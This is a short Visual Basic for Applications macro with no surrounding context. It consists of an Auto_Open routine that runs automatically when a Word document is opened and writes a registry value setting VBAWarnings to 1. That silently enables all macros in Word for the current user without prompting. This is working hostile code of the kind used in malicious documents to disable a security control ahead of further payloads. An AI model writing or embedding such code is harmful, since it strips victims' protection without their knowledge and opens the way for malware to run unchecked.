Sub Auto_Open()
	set wso = CreateObject("WScript.Shell")
	wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
End Sub

